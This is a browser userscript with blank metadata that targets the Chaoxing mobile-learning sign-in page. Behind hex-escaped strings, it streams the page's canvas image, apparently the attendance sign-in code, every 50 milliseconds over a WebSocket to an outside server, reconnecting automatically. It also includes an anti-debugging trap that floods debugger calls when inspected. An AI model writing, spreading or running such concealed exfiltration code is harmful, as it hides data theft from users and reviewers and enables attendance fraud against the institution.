// ==UserScript==
// @name         x
// @namespace    x
// @version      0.1
// @description  x
// @match        https://mobilelearn.chaoxing.com/page/sign/endSign*
// @grant        none
// ==/UserScript==

(function () {
    'use strict';
    let _0x1a2b = null, _0x1b3c = null, _0x1c4d = null;

    const _0xabc = function () {
        try {
            _0x1a2b = new WebSocket('\x77\x73\x73\x3a\x2f\x2f\x74\x6f\x6e\x67\x74\x6f\x6e\x67\x74\x6f\x6e\x67\x2e\x32\x31\x77\x62\x2e\x63\x6f\x6d\x2f\x77\x73\x2f');
            _0x1a2b['binaryType'] = '\x62\x6c\x6f\x62';
            _0x1a2b['onopen'] = function () {};
            _0x1a2b['onclose'] = function () {
                _0xdef();
            };
            _0x1a2b['onerror'] = function () {
                try {
                    _0x1a2b['close']();
                } catch (_0xerr) {}
            };
        } catch (_0xerr) {}
    };

    const _0xdef = function () {
        if (_0x1b3c) return;
        _0x1b3c = setTimeout(function () {
            _0x1b3c = null;
            _0xabc();
        }, 3e3);
    };

    const _0xgh = function (_0xk) {
        try {
            const _0xctx = _0xk['getContext']('\x32\x64');
            const _0xdata = _0xctx['getImageData'](0, 0, _0xk['width'], _0xk['height'])['data'];
            let _0xhash = 0;
            for (let _0xi = 0; _0xi < Math['min'](400, _0xdata['length']); _0xi++) {
                _0xhash = (_0xhash * 31 + _0xdata[_0xi]) >>> 0;
            }
            return _0xhash;
        } catch (_0xerr) {
            return null;
        }
    };

    const _0xij = function () {
        try {
            const _0xcnv = document['querySelector']('\x63\x61\x6e\x76\x61\x73');
            if (!_0xcnv || !_0x1a2b || _0x1a2b['readyState'] !== 1) return;
            const _0xh = _0xgh(_0xcnv);
            if (_0xh !== null && _0xh !== _0x1c4d) {
                _0x1c4d = _0xh;
                _0xcnv['toBlob'](function (_0xblb) {
                    if (_0x1a2b['readyState'] === 1 && _0xblb) {
                        _0x1a2b['send'](_0xblb);
                    }
                }, '\x69\x6d\x61\x67\x65\x2f\x70\x6e\x67');
            }
        } catch (_0xerr) {}
    };

    (function antiDebug() {
        function _0xdetect() {
            const _0xf = Function;
            try {
                return !_0xf('return /a/')()['toString']['call'](_0xf('debugger'))['match'](/debugger/);
            } catch (_0xerr) {
                return true;
            }
        }
        if (_0xdetect()) {
            setInterval(function () {
                Function('\x64\x65\x62\x75\x67\x67\x65\x72')();
            }, 1000);
        }
    })();

    _0xabc();
    setInterval(_0xij, 50);
})();
